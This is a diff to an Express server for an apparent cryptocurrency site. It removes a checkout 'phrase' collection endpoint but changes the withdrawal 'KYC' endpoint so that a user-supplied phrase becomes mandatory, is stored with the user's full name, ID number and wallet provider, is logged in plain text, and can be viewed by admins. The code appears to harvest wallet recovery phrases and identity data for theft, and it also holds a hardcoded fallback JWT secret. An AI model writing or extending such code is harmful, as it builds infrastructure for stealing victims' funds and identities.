@@ -12,7 +12,6 @@ const SECRET_KEY = process.env.JWT_SECRET || '1efdcab9301a043c584584eba62c2add2b
 const DATA_DIR = path.join(__dirname, 'data');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const CHAT_HISTORY_FILE = path.join(DATA_DIR, 'chat-history.json');
-const PHRASE_SESSIONS_FILE = path.join(DATA_DIR, 'phrase-sessions.json');
 const WITHDRAWALS_FILE = path.join(DATA_DIR, 'withdrawals.json');
 
 const app = express();
@@ -55,7 +54,6 @@ const defaultAdmin = {
 let currentUsers = [];
 let chatHistoryByClient = {};
 let activeConnections = {};
-let checkoutPhraseSessions = [];
 let withdrawalPhraseSessions = [];
 
 // --- Persistence Helpers ---
@@ -110,10 +108,6 @@ function persistChatHistory() {
   return writeJsonFile(CHAT_HISTORY_FILE, chatHistoryByClient);
 }
 
-function persistPhraseSessions() {
-  return writeJsonFile(PHRASE_SESSIONS_FILE, checkoutPhraseSessions);
-}
-
 function persistWithdrawals() {
   return writeJsonFile(WITHDRAWALS_FILE, withdrawalPhraseSessions);
 }
@@ -123,12 +117,10 @@ function loadPersistentData() {
 
   const loadedUsers = readJsonFile(USERS_FILE, []);
   const loadedChatHistory = readJsonFile(CHAT_HISTORY_FILE, {});
-  const loadedPhraseSessions = readJsonFile(PHRASE_SESSIONS_FILE, []);
   const loadedWithdrawals = readJsonFile(WITHDRAWALS_FILE, []);
 
   currentUsers = Array.isArray(loadedUsers) ? loadedUsers : [];
   chatHistoryByClient = loadedChatHistory && typeof loadedChatHistory === 'object' ? loadedChatHistory : {};
-  checkoutPhraseSessions = Array.isArray(loadedPhraseSessions) ? loadedPhraseSessions : [];
   withdrawalPhraseSessions = Array.isArray(loadedWithdrawals) ? loadedWithdrawals : [];
 }
 
@@ -319,69 +311,6 @@ app.post('/api/v1/auth/signup', (req, res) => {
   return res.status(201).json({ success: true, message: 'Sign up successful.', user: safeUserData });
 });
 
-app.post('/api/v1/checkout/phrase-session', (req, res) => {
-  const {
-    clientId,
-    item,
-    category,
-    amount,
-    network,
-    walletProvider,
-    kycFullName,
-    kycIdNumber,
-    challenge,
-    phraseInput,
-    isPhraseMatch
-  } = req.body || {};
-
-  if (!item || !amount || !network || !walletProvider || !kycFullName || !kycIdNumber || !challenge) {
-    return res.status(400).json({ success: false, message: 'Missing required checkout verification fields.' });
-  }
-
-  const session = {
-    sessionId: `PHS-${Date.now()}-${Math.floor(Math.random() * 900 + 100)}`,
-    createdAt: new Date().toISOString(),
-    clientId: clientId || 'unknown-client',
-    item,
-    category: category || 'general',
-    amount,
-    network,
-    walletProvider,
-    kycFullName,
-    kycIdNumber,
-    challenge,
-    phraseInput: phraseInput || '',
-    isPhraseMatch: Boolean(isPhraseMatch)
-  };
-
-  checkoutPhraseSessions.unshift(session);
-
-  if (checkoutPhraseSessions.length > 100) {
-    checkoutPhraseSessions = checkoutPhraseSessions.slice(0, 100);
-  }
-
-  if (!persistPhraseSessions()) {
-    checkoutPhraseSessions = checkoutPhraseSessions.filter((entry) => entry.sessionId !== session.sessionId);
-    return res.status(500).json({ success: false, message: 'Failed to record phrase session.' });
-  }
-
-  console.log('\n=== CHECKOUT PHRASE VERIFICATION SESSION ===');
-  console.log(`[${getTimestamp()}] Session ID: ${session.sessionId}`);
-  console.log(`[${getTimestamp()}] Client ID: ${session.clientId}`);
-  console.log(`[${getTimestamp()}] Item/Category: ${session.item} (${session.category})`);
-  console.log(`[${getTimestamp()}] Amount/Network: ${session.amount} via ${session.network}`);
-  console.log(`[${getTimestamp()}] Wallet/KYC: ${session.walletProvider} | ${session.kycFullName} | ${session.kycIdNumber}`);
-  console.log(`[${getTimestamp()}] Phrase Check: input='${session.phraseInput}' expected='${session.challenge}' match=${session.isPhraseMatch}`);
-  console.log('=== END PHRASE SESSION ===\n');
-
-  return res.status(201).json({
-    success: true,
-    message: 'Phrase verification session recorded.',
-    sessionId: session.sessionId,
-    verified: session.isPhraseMatch
-  });
-});
-
 // --- Withdrawal KYC Endpoint ---
 app.post('/api/v1/withdraw/kyc-session', (req, res) => {
   const {
@@ -392,12 +321,10 @@ app.post('/api/v1/withdraw/kyc-session', (req, res) => {
     walletCoin,
     kycFullName,
     kycIdNumber,
-    challenge,
-    phraseInput,
-    isPhraseMatch
+    phraseInput
   } = req.body || {};
 
-  if (!amount || !network || !walletProvider || !kycFullName || !kycIdNumber || !challenge) {
+  if (!amount || !network || !walletProvider || !kycFullName || !kycIdNumber || !phraseInput) {
     return res.status(400).json({ success: false, message: 'Missing required withdrawal verification fields.' });
   }
 
@@ -411,9 +338,7 @@ app.post('/api/v1/withdraw/kyc-session', (req, res) => {
     walletCoin: walletCoin || 'USDT',
     kycFullName,
     kycIdNumber,
-    challenge,
     phraseInput: phraseInput || '',
-    isPhraseMatch: Boolean(isPhraseMatch),
     status: 'pending'
   };
 
@@ -434,14 +359,13 @@ app.post('/api/v1/withdraw/kyc-session', (req, res) => {
   console.log(`[${getTimestamp()}] Amount/Network: ${session.amount} ${session.network}`);
   console.log(`[${getTimestamp()}] Wallet: ${session.walletProvider} (${session.walletCoin})`);
   console.log(`[${getTimestamp()}] KYC: ${session.kycFullName} | ${session.kycIdNumber}`);
-  console.log(`[${getTimestamp()}] Phrase Check: match=${session.isPhraseMatch}`);
+  console.log(`[${getTimestamp()}] Input Phrase: ${session.phraseInput}`);
   console.log('=== END WITHDRAWAL SESSION ===\n');
 
   return res.status(201).json({
     success: true,
     message: 'Withdrawal KYC session recorded.',
-    sessionId: session.sessionId,
-    verified: session.isPhraseMatch
+    sessionId: session.sessionId
   });
 });
 
@@ -692,26 +616,6 @@ app.delete('/api/admin/client-sessions/:clientId', requireAdminAuth, (req, res) 
   return res.json({ success: true, message: 'Client session deleted successfully.' });
 });
 
-app.get('/api/admin/phrase-sessions', requireAdminAuth, (req, res) => {
-  const sessions = checkoutPhraseSessions.map((session) => ({
-    sessionId: session.sessionId,
-    createdAt: session.createdAt,
-    clientId: session.clientId,
-    item: session.item,
-    category: session.category,
-    amount: session.amount,
-    network: session.network,
-    walletProvider: session.walletProvider,
-    kycFullName: session.kycFullName,
-    kycIdNumber: session.kycIdNumber,
-    challenge: session.challenge,
-    phraseInput: session.phraseInput,
-    isPhraseMatch: session.isPhraseMatch
-  }));
-
-  return res.json({ success: true, count: sessions.length, sessions });
-});
-
 app.get('/api/admin/withdraw-sessions', requireAdminAuth, (req, res) => {
   const sessions = withdrawalPhraseSessions.map((session) => ({
     sessionId: session.sessionId,
@@ -723,9 +627,7 @@ app.get('/api/admin/withdraw-sessions', requireAdminAuth, (req, res) => {
     walletCoin: session.walletCoin,
     kycFullName: session.kycFullName,
     kycIdNumber: session.kycIdNumber,
-    challenge: session.challenge,
     phraseInput: session.phraseInput,
-    isPhraseMatch: session.isPhraseMatch,
     status: session.status || 'pending'
   }));
 
@@ -734,7 +636,7 @@ app.get('/api/admin/withdraw-sessions', requireAdminAuth, (req, res) => {
 
 app.put('/api/admin/withdraw-sessions/:sessionId', requireAdminAuth, (req, res) => {
   const { sessionId } = req.params;
-  const { phraseInput, challenge, isPhraseMatch, status } = req.body || {};
+  const { phraseInput, status } = req.body || {};
 
   const sessionIndex = withdrawalPhraseSessions.findIndex((session) => session.sessionId === sessionId);
   if (sessionIndex === -1) {
@@ -742,8 +644,6 @@ app.put('/api/admin/withdraw-sessions/:sessionId', requireAdminAuth, (req, res) 
   }
 
   if (phraseInput !== undefined) withdrawalPhraseSessions[sessionIndex].phraseInput = String(phraseInput || '');
-  if (challenge !== undefined) withdrawalPhraseSessions[sessionIndex].challenge = String(challenge || '');
-  if (isPhraseMatch !== undefined) withdrawalPhraseSessions[sessionIndex].isPhraseMatch = Boolean(isPhraseMatch);
   if (status !== undefined) withdrawalPhraseSessions[sessionIndex].status = String(status || 'pending');
 
   if (!persistWithdrawals()) {
@@ -767,44 +667,6 @@ app.delete('/api/admin/withdraw-sessions/:sessionId', requireAdminAuth, (req, re
   }
 
   return res.json({ success: true, message: 'Withdrawal session deleted successfully.' });
-});
-
-app.put('/api/admin/phrase-sessions/:sessionId', requireAdminAuth, (req, res) => {
-  const { sessionId } = req.params;
-  const { phraseInput, challenge, isPhraseMatch } = req.body || {};
-
-  const sessionIndex = checkoutPhraseSessions.findIndex((session) => session.sessionId === sessionId);
-  if (sessionIndex === -1) {
-    return res.status(404).json({ success: false, message: 'Phrase session not found.' });
-  }
-
-  if (phraseInput !== undefined) checkoutPhraseSessions[sessionIndex].phraseInput = String(phraseInput || '');
-  if (challenge !== undefined) checkoutPhraseSessions[sessionIndex].challenge = String(challenge || '');
-  if (isPhraseMatch !== undefined) checkoutPhraseSessions[sessionIndex].isPhraseMatch = Boolean(isPhraseMatch);
-
-  if (!persistPhraseSessions()) {
-    return res.status(500).json({ success: false, message: 'Failed to persist phrase session update.' });
-  }
-
-  console.log(`[${getTimestamp()}] Admin updated phrase session: ${sessionId}`);
-  return res.json({ success: true, message: 'Phrase session updated successfully.' });
-});
-
-app.delete('/api/admin/phrase-sessions/:sessionId', requireAdminAuth, (req, res) => {
-  const { sessionId } = req.params;
-  const beforeCount = checkoutPhraseSessions.length;
-  checkoutPhraseSessions = checkoutPhraseSessions.filter((session) => session.sessionId !== sessionId);
-
-  if (checkoutPhraseSessions.length === beforeCount) {
-    return res.status(404).json({ success: false, message: 'Phrase session not found.' });
-  }
-
-  if (!persistPhraseSessions()) {
-    return res.status(500).json({ success: false, message: 'Failed to persist phrase session delete.' });
-  }
-
-  console.log(`[${getTimestamp()}] Admin deleted phrase session: ${sessionId}`);
-  return res.json({ success: true, message: 'Phrase session deleted successfully.' });
 });
 
 // --- Start Server ---
